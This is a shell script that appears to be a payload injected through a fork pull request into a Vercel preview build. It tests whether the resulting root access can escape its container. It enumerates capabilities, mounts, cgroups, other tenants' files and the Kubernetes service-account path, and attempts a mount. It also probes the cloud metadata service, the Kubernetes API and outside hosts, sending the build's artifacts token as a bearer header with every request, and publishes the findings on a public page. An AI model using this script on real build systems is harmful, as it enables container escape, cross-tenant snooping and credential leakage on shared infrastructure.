#!/bin/sh
# Payload introduced ONLY by the fork PR. Question it answers:
# is the root we get inside a namespaced container, or a jail on a shared host?
OUT=../../public
mkdir -p "$OUT"
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > "$OUT/index.html"
{
  echo "== identity =="
  id
  grep -E '^(Uid|Gid|CapEff|CapInv|Seccomp|SeccompFilters):' /proc/self/status
  echo "hostname=$(hostname) uptime=$(cut -d' ' -f1 /proc/uptime)s"
  echo "AWS_EXECUTION_ENV=${AWS_EXECUTION_ENV:-unset} AWS_REGION=${AWS_REGION:-unset}"
  echo "AWS_* names: $(env | grep -o '^AWS_[A-Z_]*' | sort | tr '\n' ' ')"
  echo "KUBERNETES_* names: $(env | grep -o '^KUBERNETES_[A-Z_]*' | sort | tr '\n' ' ')"
  echo "TURBO_CACHE_DIR=${TURBO_CACHE_DIR:-unset}"

  echo "== pid namespace: how many processes are visible =="
  ls /proc | grep -E '^[0-9]+$' | wc -l
  echo -n "pid1 cmdline: "; tr '\0' ' ' < /proc/1/cmdline | head -c 160; echo

  echo "== mounts (non-virtual) =="
  grep -v -E 'proc|sysfs|cgroup|devpts|mqueue' /proc/mounts | head -25

  echo "== cgroups =="
  head -5 /proc/self/cgroup
  ls /sys/fs/cgroup 2>&1 | head -8

  echo "== can we mount? (needs CAP_SYS_ADMIN + syscall allowed) =="
  mkdir -p /tmp/escapetest && mount -t tmpfs tmpfs /tmp/escapetest 2>&1 | head -2
  ls -la /tmp/escapetest 2>&1 | head -3

  echo "== other tenants' files on this machine? =="
  ls -la /root /home /var/lib 2>&1 | head -20
  echo -n "cache dirs found: "
  find / -maxdepth 4 -type d -iname '*cache*' 2>/dev/null | head -12 | tr '\n' ' '
  echo
  echo -n "/run and /var/run: "; ls /run /var/run 2>&1 | head -12 | tr '\n' ' '
  echo
  echo -n "k8s serviceaccount: "; ls /var/run/secrets/kubernetes.io/serviceaccount 2>&1 | head -4
  echo -n "/etc/hosts: "; head -4 /etc/hosts
  echo -n "/etc/resolv.conf: "; head -3 /etc/resolv.conf
  echo -n "dmesg tail: "; dmesg 2>&1 | tail -3
} > "$OUT/rce.txt"
{
  echo "== reachability (status + body length + sha256 prefix; bodies never printed) =="
  node -e '
const http=require("http"),crypto=require("crypto");
const tests=[
 ["IMDSv1 meta-data","GET","http://169.254.169.254/latest/meta-data/"],
 ["IMDSv2 token","PUT","http://169.254.169.254/latest/api/token"],
 ["k8s api","GET",(process.env.KUBERNETES_SERVICE_HOST?("https://"+process.env.KUBERNETES_SERVICE_HOST+":"+ (process.env.KUBERNETES_SERVICE_PORT||"443")):"none")],
 ["arbitrary egress example.com","GET","http://example.com/"],
 ["arbitrary egress 1.1.1.1","GET","http://1.1.1.1/"],
 ["vercel build-containers ep","GET",(process.env.VERCEL_API_BUILD_CONTAINERS_ENDPOINT||"none")],
];
const run=(i)=>{
  if(i>=tests.length) process.exit(0);
  const [name,method,url]=tests[i];
  if(url==="none"){console.log("  "+name+": n/a");return run(i+1);}
  const req=http.request({url,method,timeout:3500,headers:{"X-Amz-Imds-Token-Expires":"1","Authorization":"Bearer "+(process.env.VERCEL_ARTIFACTS_TOKEN||"")}},res=>{
    let b="";res.on("data",c=>b+=c);res.on("end",()=>{
      const h=crypto.createHash("sha256").update(b).digest("hex").slice(0,12);
      console.log("  "+name+" -> "+res.statusCode+" | "+b.length+" bytes | sha "+h);
      run(i+1);
    });
  });
  req.on("error",e=>{console.log("  "+name+" -> ERR "+e.code);run(i+1);});
  req.end();
};
run(0);
' >> "$OUT/rce.txt" 2>&1
}
sleep 2
cat "$OUT/rce.txt"
